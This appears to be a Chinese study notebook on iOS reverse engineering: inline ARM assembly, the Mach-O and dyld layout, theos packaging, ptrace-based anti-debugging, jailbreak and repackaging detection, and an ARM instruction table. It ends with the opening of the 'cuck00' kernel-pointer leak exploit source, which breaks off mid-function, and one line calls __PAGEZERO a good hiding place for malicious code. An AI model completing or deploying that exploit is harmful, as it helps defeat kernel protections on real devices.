### .s 汇编语言源程序;  操作: 汇编
### .S 汇编语言源程序;  操作: 预处理 + 汇编

```
1.小写的 s文件，在后期阶段不会再进行预处理操作了，所以我们不能在其内写上预处理语句。

    一般是 .c 文件经过汇编器处理后的输出。 如 GCC 编译器就可以指定 -S 选项进行输出， 且是经过预处理器处理后的了。

2.大写的 S 文件，还会进行预处理、汇编等操作，所以我们可以在这里面加入预处理的命令。编译器在编译汇编大 S 

    文件之前会进行预处理操作。

    常用这种形式的汇编文件作为工程内的汇编源文件(如 Linux 和 u-boot)， 因为在文件内可以很方便的使用常用的

    预处理指令来进行宏定义，条件编译， 和文件包含操作。

    如: #include, #define, #ifdef, #else, #if, #elif, #endif 等预处理指令。

    具体的应用可以参考 Linux 或者 u-boot 的 .S 源代码。
----------------------------------------------------------------------------

    asm(汇编);

在针对ARM体系结构的编程中，一般很难直接使用C语言产生操作协处理器的相关代码，因此使用汇编语言来实现就成为了唯一的选择。

但如果完全通过汇编代码实现，又会过于复杂、难以调试。因此，C语言内嵌汇编的方式倒是一个不错的选择。

然而，使用内联汇编的一个主要问题是，内联汇编的语法格式与使用的编译器直接相关，也就是说，使用不同的C编译器内联汇编代码时，它们的写法是各不相同的。

下面介绍在ARM体系结构下GCC的内联汇编。GCC内联汇编的一般格式：asm(汇编);

asm(   
 
 
    代码列表   
    : 输出运算符列表   
    : 输入运算符列表   
    : 被更改资源列表   
);

在C代码中嵌入汇编需要使用asm关键字，在asm的修饰下，代码列表、输出运算符列表、输入运算符列表和被更改的资源列表这4个部分被3个“:”分隔。下面，我们看一个例子：

void test(void) 
{   
    ……   
    asm(   
        "mov r1,#1\n"   
        :   
        :   
        :"r1"   
    );   
    ……   
} 

注：换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。

函数test中内嵌了一条汇编指令实现将立即数1赋值给寄存器R1的操作。由于没有任何形式的输出和输入，因此输出和输入列表的位置上什么都没有填写。但是，在汇编代码执行过程中R1寄存器会被修改，因此为了通知编译器，在被更改资源列表中，需要写上寄存器R1。

寄存器被修改这种现象发生的频率还是比较高的。例如，在调用某段汇编程序之前，寄存器R1可能已经保存了某个重要数据，当汇编指令被调用之后，R1寄存器被赋予了新的值，原来的值就会被修改，所以，需要将会被修改的寄存器放入到被更改资源列表中，这样编译器会自动帮助我们解决这个问题。也可以说，出现在被更改资源列表中的资源会在调用汇编代码一开始就首先保存起来，然后在汇编代码结束时释放出去。所以，上面的代码与如下代码从语义上来说是等价的。

void test(void) 
{   
    ……   
    asm(   
        "stmfd sp!,{r1}\n" 
        "mov r1,#1\n"   
        "ldmfd sp!,{r1}\n"   
    );   
    ……   
} 

这段代码中的内联汇编既无输出又无输入，也没有资源被更改，只留下了汇编代码的部分。由于程序在修改R1之前已经将寄存器R1的值压入了堆栈，在使用完之后，又将R1的值从堆栈中弹出，所以，通过被更改资源列表来临时保存R1的值就没什么必要了。

在以上两段代码中，汇编指令都是独立运行的。但更多的时候，C和内联汇编之间会存在一种交互。C程序需要把某些值传递给内联汇编运算，内联汇编也会把运算结果输出给C代码。此时就可以通过将适当的值列在输入运算符列表和输出运算符列表中来实现这一要求。请看下面的例子：

void test(void) 
{   
    int tmp=5;   
    asm(   
        "mov r4,%0\n"   
        :   
        :"r"(tmp)   
        :"r4"   
    );   
} 

上面的代码中有一条mov指令，该指令将%0赋值给R4。这里，符号%0代表出现在输入运算符列表和输出运算符列表中的第一个值。如果%1存在的话，那么它就代表出现在列表中的第二个值，依此类推。所以，在该段代码中，%0代表的就是“r”(tmp)这个表达式的值了。

那么这个新的表达式又该怎样解释呢？原来，在“r”(tmp)这个表达式中，tmp代表的正是C语言向内联汇编输入的变量，操作符“r”则代表tmp的值会通过某一个寄存器来传递。在GCC4中与之相类似的操作符还包括“m”、“I”，等等，其含义见下表：

ARM嵌入式开发中的GCC内联汇编简介

与输入运算符列表的应用方法一致，当C语言需要利用内联汇编输出结果时，可以使用输出运算符列表来实现，其格式应该是下面这样的。

void test(void) 
{   
    int tmp;   
    asm(   
        "mov %0,#1\n"   
        :"=r"(tmp)   
        :   
    );   
} 

在上面的代码中，原本应出现在输入运算符列表中的运算符，现在出现在了输出运算符列表中，同时变量tmp将会存储内联汇编的输出结果。
这里有一点可能已经引起大家的注意了，上面的代码中操作符r的前面多了一个“=”。这个等号被称为约束修饰符，其作用是对内联汇编的操作符进行修饰。

当一个操作符没有修饰符对其进行修饰时，代表这个操作符是只读的。当我们需要将内联汇编的结果输出出来，那么至少要保证该操作符是可写的。因此，“=”或者“+”也就必不可少了。

```
----------------------------------------------------------------------------------------------------------------

## dyld
动态链接器，其本质也是 Mach-O 文件，一个专门用来加载 dylib 文件的库。
dyld 位于 /usr/lib/dyld，可以在 macOS 和越狱机中找到。
dyld 会将 App 依赖的动态库和 App 文件加载到内存执行。

## Mach-O 文件

### Mach header：描述 Mach-O 的 CPU 架构、文件类型以及加载命令等；
### Load commands：描述了文件中数据的具体组织结构，不同的数据类型使用不同的加载命令；
### Data：Data 中的每个段（segment）的数据都保存在这里;

### 每个段（segment）都有Section : 存放了具体的数据与代码，主要包含以下三种类型：

__TEXT 包含 Mach header，被执行的代码和只读常量（如C 字符串）。只读可执行（r-x）。

__DATA 包含全局变量，静态变量等。可读写（rw-）。

__LINKEDIT 包含了加载程序的元数据，比如函数的名称和地址。只读（r–-）。

## MachOView : 查看MachO文件格式信息
### MachOView源码地址：https://github.com/gdbinit/MachOView

```
Mach-O格式全称为Mach Object文件格式的缩写，是mac上可执行文件的格式，
类似于windows上的PE格式 (Portable Executable ), linux上的elf格式 (Executable and Linking Format)。

Mach-O文件类型分为：

1、Executable：应用的主要二进制

2、Dylib Library：动态链接库（又称DSO或DLL）

3、Static Library：静态链接库

4、Bundle：不能被链接的Dylib，只能在运行时使用dlopen( )加载，可当做macOS的插件

5、Relocatable Object File ：可重定向文件类型

那什么又是FatFile/FatBinary？

简单来说，就是一个由不同的编译架构后的Mach-O产物所合成的集合体。
一个架构的mach-O只能在相同架构的机器或者模拟器上用，为了支持不同架构需要一个集合体。
```

```
MachOView在load Commands里面加载了这么些动态库: 

LC_SEGMENT_64：定义一个（64位）段， 当文件加载后它将被映射到地址空间。包括段内节（section）的定义。

LC_SYMTAB：为该文件定义符号表（‘stabs’ 风格）和字符串表。 他们在链接文件时被链接器使用，同时也用于调试器映射符号到源文件。具体来说，符号表定义本地符号仅用于调试，而已定义和未定义external 符号被链接器使用。

LC_DYSYMTAB：提供符号表中给出符号的额外符号信息给动态链接器，以便其处理。 包括专门为此而设的一个间接符号表的定义。

LC_DYLD_INFO_ONLY：定义一个附加 压缩的动态链接器信息节，它包含在其他事项中用到的 动态绑定符号和操作码的元数据。stub 绑定器（“dyld_stub_binder”），它涉及的动态间接链接利用了这点。 “_ONLY” 后缀t表明这个加载指令是程序运行必须的，, 这样那些旧到不能理解这个加载指令的链接器就在这里停下。

LC_LOAD_DYLINKER: 加载一个动态链接器。在OS X上，通常是“/usr/lib/dyld”。LC_LOAD_DYLIB: 加载一个动态链接共享库。举例来说，“/usr/lib/libSystem.B.dylib”，这是C标准库的实现再加上一堆其他的事务（系统调用和内核服务，其他系统库等）。每个库由动态链接器加载并包含一个符号表，符号链接名称是查找匹配的符号地址。

LC_MAIN：指明程序的入口点。在本案例，是函数themain()的地址。

LC_UUID：提供一个唯一的随机UUID，通常由静态链接器生成。

LC_VERSION_MIN_MACOSX：程序可运行的最低OS X版本要求

LC_SOURCE_VERSION:：构建二进制文件的源码版本号。

LC_FUNCTION_STARTS：定义一个函数起始地址表，使调试器和其他程序易于看到一个地址是否在函数内。

LC_DATA_IN_CODE：定义在代码段内的非指令的表。

LC_DYLIB_CODE_SIGN_DRS: 为已链接的动态库定义代码签名 指定要求。

Xcode工程里的系统库 则转化为LC_LOAD_DYLIB 所谓dylib嵌入就是指的这个过程 此在后文中予以介绍

而关于LC_SEGMENT_64头部则有如下的定义说明

__PAGEZERO：一个全用0填充的段，用于抓取空指针引用。这通常不会占用磁盘空间(或内存空间)，因为它运行时映射为一群0啊。顺便说一句，这个段是隐藏恶意代码的好地方。

__TEXT：本段只有可执行代码和其他只读数据。

__text：本段是可执行机器码。

__stubs：间接符号存根。这些跳转到非延迟加载 (“随运行加载”) 和延迟加载(“初次使用时加载”) 间接引用的（可写）位置的值 (例如条目“__la_symbol_ptr”，我们很快就会看到)。对于延迟加载引用，其地址跳转讲首先指向一个解析过程，但初始化解析后会指向一个确定的地址。 对于非延迟加载引用，其地址跳转会始终指向一个确定的地址，因为动态链接器在加载可执行文件时就修正好了。

__stub_helper：提供助手来解决延迟加载符号。如上所述，延迟加载的间接符号指针将指到这里面，直到得到确定地址。

__cstring： constant (只读) C风格字符串（如”Hello, world!n”）的节。链接器在生成最终产品时会清除重复语句。

__unwind_info：一个紧凑格式，为了存储堆栈展开信息供处理异常。此节由链接器生成，通过“__eh_frame”里供OS X异常处理的信息。

__eh_frame： 一个标准的节，用于异常处理，它提供堆栈展开信息，以DWARF格式。


__DATA：用于读取和写入数据的一个段。

__nl_symbol_ptr：非延迟导入符号指针表。

__la_symbol_ptr：延迟导入符号指针表。本节开始时，指针们指向解析助手，如前所讨述。

__got：全局偏移表–— （非延迟）导入全局指针表。


__LINKEDIT：包含给链接器（“链接编辑器‘）的原始数据的段，在本案例中，包括符号和字符串表，压缩动态链接信息，代码签名存托凭证，以及间接符号表–所有这一切的占区都被加载指令指定了。

```


theos .deb插件
```
   .
├── .theos
|   ├── _ 
|   |    └── ...  *
|   ├── obj 
|   |    └── ...  *
|   ├── packages 
|   |    └── ...   记录版本号
|   ├── build_session
|   ├── fakeroot
|   └── last_package    当前打包成功以后放的路径
├── obj   实际上跟上面.theos/obj的目录是一样的
|   └── debug/...   空的
├── packages
|   └── ...   你的包程序，也就是你的插件的包，在很多威锋源里面的*.deb文件，每次打包都会生成一个包文件，每次包文件的版本号都会++
├── control    配置信息
├── Makefile   环境变量信息
├── Tweak.xm      编写logos hook代码
├── ***.plist     目标进程，就是你需要修改、hook的App的Bundle identifier

_ 目录
├── DEBIAN
|   └── control    配置信息
├── Library 
|   |    └── MobileSubstrate/Dynamiclibrarte/**.plist  目标进程，就是你需要修改、hook的App的Bundle identifier

obj 目录  上面两个obj目录实际上都是一样的，只不过在根目录中的obj在打包安装的整个过程中都是空的，我也不知道作者当时是怎么想的，所以就绕过去，可能还有别的作用的，现在是没找到相关的内容。
├── debug
|   ├── arm64    arm64的*.dylib 动态库
|   └── armv7     armv7的*.dylib 动态库
|   |    └──  *.dylib   合并arm64、armv7的动态库  

```
```
采用dloen+dlsym调用ptrace
 //拼接一个 ptrace
    unsigned char funcStr[] = {
        ('a' ^ 'p'),
        ('a' ^ 't'),
        ('a' ^ 'r'),
        ('a' ^ 'a'),
        ('a' ^ 'c'),
        ('a' ^ 'e'),
        ('a' ^ '\0'),
    };
    unsigned char * p = funcStr;
    while (((*p) ^= 'a') != '\0') p++;
    
    //通过dlopen拿到句柄
    void * handle = dlopen("/usr/lib/system/libsystem_kernel.dylib", RTLD_LAZY);
    //定义函数指针
    int (*ptrace_p)(int _request, pid_t _pid, caddr_t _addr, int _data);
    
    if (handle) {
        ptrace_p = dlsym(handle, (const char *)funcStr);
        if (ptrace_p) {
            ptrace_p(PT_DENY_ATTACH, 0, 0, 0 );
        }
    }
```
```
使用这种方式调用系统函数(ptrace,syscall,sysctrl)进行防护,
就只能通过去找代码块中的汇编指令svc #0x80来定位防护代码了.
#ifdef __arm64__
    asm(
        "mov x0,#0\n"
        "mov w16,#1\n"
        "svc #0x80\n"
    );
#endif
#ifdef __arm__ //32位下
    asm(
        "mov r0,#0\n"
        "mov r12,#1\n"
        "svc #80\n"
    );
#endif

```
    asm volatile(
                     "mov x0,#31\n"
                     "mov x1,#0\n"
                     "mov x2,#0\n"
                     "mov x3,#0\n"
                     "mov x16,#26\n"//中断根据x16 里面的值，跳转ptrace
                     "svc #0x80\n"//这条指令就是触发中断（系统级别的跳转！）
                     );
```

## 判断iOS App是否被反编译
### 方案1、调用syscall(26, 31, 0, 0, 0)
### 方案2、调用sysctl
### 方案3、直接编写汇编代码，利用svc 去触发CPU的中断命令
 ```
 // 阻止 gdb/lldb 调试 //是否被gcd\lldb进行动态调试
// 调用 ptrace 设置参数 PT_DENY_ATTACH，如果有调试器依附，则会产生错误并退出
#import <dlfcn.h>
#import <sys/types.h>
 
typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif
 
void anti_gdb_debug() {
    void *handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW);
    ptrace_ptr_t ptrace_ptr = dlsym(handle, "ptrace");
    ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);
    dlclose(handle);
}
 
int main(int argc, char * argv[]) {
#ifndef DEBUG
    // 非 DEBUG 模式下禁止调试
    anti_gdb_debug();
#endif
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
 ```

## embedded.mobileprovision

为什么.ipa包上传到App Store被苹果处理之后就没有这个文件了呢？
因为embedded.mobileprovision文件里边存储的是证书相关的公钥私钥信息，
苹果会用自己的私钥验证这里边的内容，如果验证通过则说明该APP是安全的合法的，之后就会将该文件删除，
因为，App Store的APP苹果会用自己的公钥私钥进行重签名(也就是加壳)，这样该文件就失去它的意义了，所以被删除了。
这也就是为啥证书过期之后，从App Store上已经下载过的APP还可以继续使用的原因。

 而通过企业证书分发的APP，.ipa包里边还是有这个文件的，这时候苹果做安全校验的时候就是通过这个文件去做的，
 所以，如果企业证书过期了，这时候企业分发的APP就立马不能安装使用了，并且已经下载安装的APP也不能使用。
         
不存在该文件：App Store下载的.ipa、砸壳的.ipa。
存在该文件：Xcode打出来的.ipa、企业证书分发的.ipa、越狱手机上自己二次打包的.ipa。

# 汇编指令
```
SVC：SuperVisor Call

    Syntax（语法）：SVC{cond} #imm
    cond：一个可选的条件码
    imm：一个整数数值表达式，范围为

-在ARM指令中为 0 ~ 224，一个24-bit的整数值
-在Thumb指令中为 0 ~ 255，一个8-bit的整数值

Operation（操作）：
SVC指令会引起异常。这意味着处理器模式会切换到特权级。CPSR（当前程序状态寄存器）会被保存到特权模式SPSR（程序状态保护寄存器）中，程序会跳转到SVC异常处理程序（exception handler）中执行。
imm会被处理器忽略。但是，imm可以被异常处理程序（exception handler）获得，并且可以根据imm来判断请求的是什么服务。

注意：SVC在早期ARM版本的汇编语言里被称为SWI。
SWI指令反汇编为SVC指令，并且带有注释：这是以前的    SWI指令。

Condition flags（条件标志位）：此条指令不改变标志位。

Architectures（处理器架构）：
此ARM指令在所有版本的ARM架构中可用。
此16位Thumb指令在所有的支持T变种（即支持Thumb指令集）的ARM架构中可用。
该指令没有对应的32位Thumb指令。


bl 指令 跳转到标号出执行
b.le ：判断上面cmp的值是小于等于 执行标号，否则直接往下走
b.ge 大于等于 执行地址 否则往下
b.lt 判断上面camp的值是 小于 执行后面的地址中的方法 否则直接往下走
b.gt 大于 执行地址 否则往下
b.eq 等于 执行地址 否则往下
B.HI 比较结果是无符号大于，执行地址中的方法，否则不跳转
ret 返回
mov x0,#0x10 x0 = 0x10
str w10 ,[sp] 将w10寄存器的值存到 sp栈空间内存
stp x0，x1,[sp.#0x10] x0、x1 的值存入 sp + 0x10
orr x0，wzr,#0x1 x0 = wzr | 0x1
stur w10 ,[sp] 将w10寄存器的值存到 sp栈空间内存
ldr w10 ,[sp] w10 = sp栈内存中的值
ldp x0，x1,[sp] x0、x1 = sp栈内存中的值
adrp 通过基地址 + 偏移 获得一个字符串（全局变量）
将1的值,左移12位 1 0000 0000 0000 == 0x1000
将PC寄存器的低12位清零
将1 和 2 的结果相加
adrp 是计算指定的数据地址 到当前PC值的相对偏移
由于得到的结果是低12bit为0
10 1024
12 == 4KB
总结
adrp找到的是一个目标数据偏移的相对地址，他是一个不准确的地址，偏移的误差有4KB
为什么偏移的误差是4KB呐？ 在地址总线上面，10条地址总线的寻址能力是1024，12条地址总线的能力是4*1024 4KB

cmp:
ZF=1则AX=BX
ZF=0则AX！=BX
CF=1则AX<BX
CF=0则AX>=BX
CF=0并ZF=0则AX>BX
CF=1或ZF=1则AX<=BX

16位数据操作指令
名字 功能
ADC 带进位加法（ADD with Carry）
ADD 加法
AND 按位与。这里的按位与和C的”&”功能相同
ASR 算术右移（Arithmetic Shift Right）
BIC 按位清零（把一个数跟另一个无符号数的反码按位与）
CMN 负向比较（把一个数跟另一个数据的二进制补码相比较）
CMP 比较（Compare，比较两个数并且更新标志）

cmp（Compare）比较指令
CMP 把一个寄存器的内容和另一个寄存器的内容或立即数进行比较。但不存储结果，只是正确的更改标志。
一般CMP做完判断后会进行跳转，后面通常会跟上B指令！
CPY 把一个寄存器的值拷贝（COPY）到另一个寄存器中
EOR 近位异或
LSL 逻辑左移（Logic Shift Left）
LSR 逻辑右移（Logic Shift Right）
MOV 寄存器加载数据，既能用于寄存器间的传输，也能用于加载立即数
MUL 乘法（Multiplication）
MVN 加载一个数的 NOT值（取到逻辑反的值）
NEG 取二进制补码
ORR 按位或
ROR 循环右移
SBC 带借位的减法
SUB 减法（Subtraction）
TST 测试（Test，执行按位与操作，并且根据结果更新Z）
REV 在一个32位寄存器中反转（Reverse）字节序
REVH 把一个32位寄存器分成两个（Half）16位数，在每个16位数中反转字节序
REVSH 把一个32位寄存器的低16位半字进行字节反转，然后带符号扩展到32位
SXTB 带符号（Signed）扩展一个字节（Byte）到 32位
SXTH 带符号（Signed）扩展一个半字（Half）到 32位
UXTB 无符号（Unsigned）扩展一个字节（Byte）到 32位
UXTH 无符号（Unsigned）扩展一个半字（Half）到 32位

16位转移指令
名字 功能
B 无条件转移（Branch）
B<cond> 有条件（Condition）转移
BL 转移并连接（Link）。用于呼叫一个子程序，返回地址被存储在LR中
CBZ 比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）
CBNZ 比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）
IT If-Then

16位存储器数据传送指令
名字 功能
LDR 从存储器中加载（Load）字到一个寄存器（Register）中
LDRH 从存储器中加载半（Half）字到一个寄存器中
LDRB 从存储器中加载字节（Byte）到一个寄存器中
LDRSH 从存储器中加载半字，再经过带符号扩展后存储一个寄存器中
LDRSB 从存储器中加载字节，再经过带符号扩展后存储一个寄存器中
STR 把一个寄存器按字存储（Store）到存储器中
STRH 把一个寄存器存器的低半字存储到存储器中
STRB 把一个寄存器的低字节存储到存储器中
LDMIA 加载多个字，并且在加载后自增基址寄存器
STMIA 存储多个字，并且在存储后自增基址寄存器
PUSH 压入多个寄存器到栈中
POP 从栈中弹出多个值到寄存器中

其它16位指令
名字 功能
SVC 系统服务调用（Service Call）
BKPT 断点（Break Point）指令。如果调试被使能，则进入调试状态（停机）。
NOP 无操作（No Operation）
CPSIE 使能 PRIMASK(CPSIE i)/FAULTMASK(CPSIE f)——清零相应的位
CPSID 除能 PRIMASK(CPSID i)/FAULTMASK(CPSID f)——置位相应的位

32位数据操作指令
名字 功能
ADC 带进位加法
ADD 加法
ADDW 宽加法（可以加 12 位立即数）
AND 按位与（原文是逻辑与，有误——译注）
ASR 算术右移
BIC 位清零（把一个数按位取反后，与另一个数逻辑与）
BFC 位段清零
BFI 位段插入
CMN 负向比较（把一个数和另一个数的二进制补码比较，并更新标志位）
CMP 比较两个数并更新标志位
CLZ 计算前导零的数目
EOR 按位异或
LSL 逻辑左移
LSR 逻辑右移
MLA 乘加
MLS 乘减
MOVW 把 16 位立即数放到寄存器的底16位，高16位清0
MOV 加载16位立即数到寄存器（其实汇编器会产生MOVW——译注）
MOVT 把 16 位立即数放到寄存器的高16位，低 16位不影响
MVN 移动一个数的补码
MUL 乘法
ORR 按位或（原文为逻辑或，有误——译注）
ORN 把源操作数按位取反后，再执行按位或（原文为逻辑或，有误——译注）
RBIT 位反转（把一个 32 位整数先用2 进制表达，再旋转180度——译注）
REV 对一个32 位整数做按字节反转
REVH/REV16 对一个32 位整数的高低半字都执行字节反转
REVSH 对一个32 位整数的低半字执行字节反转，再带符号扩展成32位数
ROR 圆圈右移
RRX 带进位的逻辑右移一格（最高位用C 填充，且不影响C的值——译注）
SFBX 从一个32 位整数中提取任意的位段，并且带符号扩展成 32 位整数
SDIV 带符号除法
SMLAL 带符号长乘加（两个带符号的 32 位整数相乘得到 64 位的带符号积，再把积加到另一个带符号 64位整数中）
SMULL 带符号长乘法（两个带符号的 32 位整数相乘得到 64位的带符号积）
SSAT 带符号的饱和运算
SBC 带借位的减法
SUB 减法
SUBW 宽减法，可以减 12 位立即数
SXTB 字节带符号扩展到32位数
TEQ 测试是否相等（对两个数执行异或，更新标志但不存储结果）
TST 测试（对两个数执行按位与，更新Z 标志但不存储结果）
UBFX 无符号位段提取
UDIV 无符号除法
UMLAL 无符号长乘加（两个无符号的 32 位整数相乘得到 64 位的无符号积，再把积加到另一个无符号 64位整数中）
UMULL 无符号长乘法（两个无符号的 32 位整数相乘得到 64位的无符号积）
USAT 无符号饱和操作（但是源操作数是带符号的——译注）
UXTB 字节被无符号扩展到32 位（高24位清0——译注）
UXTH 半字被无符号扩展到32 位（高16位清0——译注）

32位存储器数据传送指令
名字 功能
LDR 加载字到寄存器
LDRB 加载字节到寄存器
LDRH 加载半字到寄存器
LDRSH 加载半字到寄存器，再带符号扩展到 32位
LDM 从一片连续的地址空间中加载多个字到若干寄存器
LDRD 从连续的地址空间加载双字（64 位整数）到2 个寄存器
STR 存储寄存器中的字
STRB 存储寄存器中的低字节
STRH 存储寄存器中的低半字
STM 存储若干寄存器中的字到一片连续的地址空间中
STRD 存储2 个寄存器组成的双字到连续的地址空间中
PUSH 把若干寄存器的值压入堆栈中
POP 从堆栈中弹出若干的寄存器的值

32位转移指令
名字 功能
B 无条件转移
BL 转移并连接（呼叫子程序）
TBB 以字节为单位的查表转移。从一个字节数组中选一个8位前向跳转地址并转移
TBH 以半字为单位的查表转移。从一个半字数组中选一个16 位前向跳转的地址并转移

其它32位指令
LDREX 加载字到寄存器，并且在内核中标明一段地址进入了互斥访问状态
LDREXH 加载半字到寄存器，并且在内核中标明一段地址进入了互斥访问状态
LDREXB 加载字节到寄存器，并且在内核中标明一段地址进入了互斥访问状态
STREX 检查将要写入的地址是否已进入了互斥访问状态，如果是则存储寄存器的字
STREXH 检查将要写入的地址是否已进入了互斥访问状态，如果是则存储寄存器的半字
STREXB 检查将要写入的地址是否已进入了互斥访问状态，如果是则存储寄存器的字节
CLREX 在本地的处理上清除互斥访问状态的标记（先前由 LDREX/LDREXH/LDREXB做的标记）
MRS 加载特殊功能寄存器的值到通用寄存器
MSR 存储通用寄存器的值到特殊功能寄存器
NOP 无操作
SEV 发送事件
WFE 休眠并且在发生事件时被唤醒
WFI 休眠并且在发生中断时被唤醒
ISB 指令同步隔离（与流水线和 MPU等有关）
DSB 数据同步隔离（与流水线、MPU 和cache等有关）
DMB 数据存储隔离（与流水线、MPU 和cache等有关）
```

## 防止.ipa被二次打包
1、检测plist文件中是否有SignerIdentity值，SignerIdentity值只有ipa包被反编译后篡改二进制文件再次打包，才会有此值。
(注：如果替换资源文件，比如图片、plist文件等是没有SignerIdentity这个值的)

2、检测 cryptid 的值来检测二进制文件是否被篡改。cryptid这个值在Mach-o中才有

3、IPA包上传到TestFlight或者App Store后，计算安装包中重要文件的MD5值，服务器记录，
在应用运行前首先将本地计算的 MD5 值和服务器记录的 MD5 值 进行对比，如不同，则退出应用

# 越狱检测
```
检测代码
- (BOOL)isJailbroken {

    //以下检测的过程是越往下，越狱越高级
   // /Applications/Cydia.app, /privte/var/stash

    BOOL jailbroken = NO;

    NSString *cydiaPath = @"/Applications/Cydia.app";

    NSString *aptPath = @"/private/var/lib/apt/";

    if ([[NSFileManager defaultManager] fileExistsAtPath:cydiaPath]) {

        jailbroken = YES;

    }

    if ([[NSFileManager defaultManager] fileExistsAtPath:aptPath]) {

        jailbroken = YES;

    }

    //可能存在hook了NSFileManager方法，此处用底层C stat去检测

    struct stat stat_info;

    if (0 == stat("/Library/MobileSubstrate/MobileSubstrate.dylib", &stat_info)) {

        jailbroken = YES;

    }

    if (0 == stat("/Applications/Cydia.app", &stat_info)) {

        jailbroken = YES;

    }

    if (0 == stat("/var/lib/cydia/", &stat_info)) {

        jailbroken = YES;

    }

    if (0 == stat("/var/cache/apt", &stat_info)) {

        jailbroken = YES;

    }

//    /Library/MobileSubstrate/MobileSubstrate.dylib 最重要的越狱文件，几乎所有的越狱机都会安装MobileSubstrate

//    /Applications/Cydia.app/ /var/lib/cydia/绝大多数越狱机都会安装

//    /var/cache/apt /var/lib/apt /etc/apt

//    /bin/bash /bin/sh

//    /usr/sbin/sshd /usr/libexec/ssh-keysign /etc/ssh/sshd_config

    //可能存在stat也被hook了，可以看stat是不是出自系统库，有没有被攻击者换掉

    //这种情况出现的可能性很小

    int ret;

    Dl_info dylib_info;

    int (*func_stat)(const char *,struct stat *) = stat;

    if ((ret = dladdr(func_stat, &dylib_info))) {

        NSLog(@"lib:%s",dylib_info.dli_fname);      //如果不是系统库，肯定被攻击了

        if (strcmp(dylib_info.dli_fname, "/usr/lib/system/libsystem_kernel.dylib")) {   //不相等，肯定被攻击了，相等为0

            jailbroken = YES;

        }

    }

    //还可以检测链接动态库，看下是否被链接了异常动态库，但是此方法存在appStore审核不通过的情况，这里不作罗列

    //通常，越狱机的输出结果会包含字符串： Library/MobileSubstrate/MobileSubstrate.dylib——之所以用检测链接动态库的方法，是可能存在前面的方法被hook的情况。
    //这个字符串，前面的stat已经做了

    //如果攻击者给MobileSubstrate改名，但是原理都是通过DYLD_INSERT_LIBRARIES注入动态库

    //那么可以，检测当前程序运行的环境变量

    char *env = getenv("DYLD_INSERT_LIBRARIES");

    if (env != NULL) {

        jailbroken = YES;

    }

    return jailbroken;

}

```

```
// 常见越狱文件
const char *Jailbreak_Tool_pathes[] = {
    "/Applications/Cydia.app",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/bin/bash",
    "/usr/sbin/sshd",
    "/etc/apt"
};

char *printEnv(void) {
    char *env = getenv("DYLD_INSERT_LIBRARIES");
    return env;
}

/** 当前设备是否越狱 */
+ (BOOL)isDeviceJailbreak {
    // 判断是否存在越狱文件
    for (int i = 0; i < 5; i++) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:[NSString stringWithUTF8String:Jailbreak_Tool_pathes[i]]]) {
            NSLog(@"1此设备越狱!");
            return YES;
        }
    }
    
    // 判断是否存在cydia应用
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){
        NSLog(@"2此设备越狱!");
        return YES;
    }
    
    // 读取系统所有的应用名称
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/User/Applications/"]){
        NSLog(@"3此设备越狱!");
        return YES;
    }
    
    // 读取环境变量
    if(printEnv()){
        NSLog(@"4此设备越狱!");
        return YES;
    }
    
    NSLog(@"5此设备没有越狱");
    return NO;
}


/** 文件是否被篡改 */
+ (BOOL)isDocumentHasBeenTamper {
    NSBundle *bundle = [NSBundle mainBundle];
    NSDictionary *info = [bundle infoDictionary];
    if ([info objectForKey:@"SignerIdentity"] != nil)
    {
        return YES;
    }
    return NO;
}
```

# SHSH (Signature HaSH blobs) 验证iTunes恢复固件合法性证书
```
什么是SHSH？
SHSH的全称是Signature HasH blobs，中文：签名证书。
SHSH就是验证iTunes恢复固件操作合法性的一个证书。
当我们用iTunes进行升级 / 恢复固件操作时，
iTunes会向苹果验证服务器提交待升级 / 恢复固件设备的ECID，
并申请获取升级 / 恢复该版固件的SHSH，
苹果会通过验证服务器发送一个和ECID对应的SHSH证书给iTunes，
iTunes就可以继续进行和这个SHSH相对应版本的固件进行升级 / 恢复。
```

```
SHSH有什么作用?
苹果基制是发布新版固件之后，旧版本固件将会在短时间内停止验证。
需要恢复苹果已经关闭验证的固件，
必须通过SHSH备份以及降级工具签证
欺骗苹果服务的验证进行恢复已经关闭验证的固件，这就是降级。
```

## cuck00
```
#include <errno.h>
#include <stdint.h>             // uint*_t
#include <stdio.h>              // printf
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror, memcpy, memset
#include <sys/mman.h>           // mmap
#include <mach/mach.h>

#include "iokit.h"

#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)
#define ADDR "0x%llx"

#define SafePortDestroy(x) \
do \
{ \
    if(MACH_PORT_VALID(x)) \
    { \
        mach_port_destroy(mach_task_self(), x); \
        x = MACH_PORT_NULL; \
    } \
} while(0)

#define IOSafeRelease(x) \
do \
{ \
    if(MACH_PORT_VALID(x)) \
    { \
        IOObjectRelease(x); \
        x = MACH_PORT_NULL; \
    } \
} while(0)

typedef uint64_t kptr_t;

typedef struct
{
    mach_msg_header_t head;
    struct
    {
        mach_msg_size_t size;
        natural_t type;
        uintptr_t ref[8];
    } notify;
    struct
    {
        kern_return_t ret;
        uintptr_t ref[8];
    } content;
    mach_msg_max_trailer_t trailer;
} msg_t;

const uint32_t IOSURFACE_UC_TYPE             =  0;
const uint32_t IOSURFACE_CREATE_SURFACE      =  0;
const uint32_t IOSURFACE_INCREMENT_USE_COUNT = 14;
const uint32_t IOSURFACE_DECREMENT_USE_COUNT = 15;
const uint32_t IOSURFACE_SET_NOTIFY          = 17;
#define IOSURFACE_CREATE_OUTSIZE 0xdd0 /* for iOS 13.3 / macOS 10.15.2, varies with version */

kptr_t leak_port_addr(mach_port_t port)
{
    kptr_t result = 0;
    kern_return_t ret;
    task_t self = mach_task_self();
    io_service_t service = MACH_PORT_NULL;
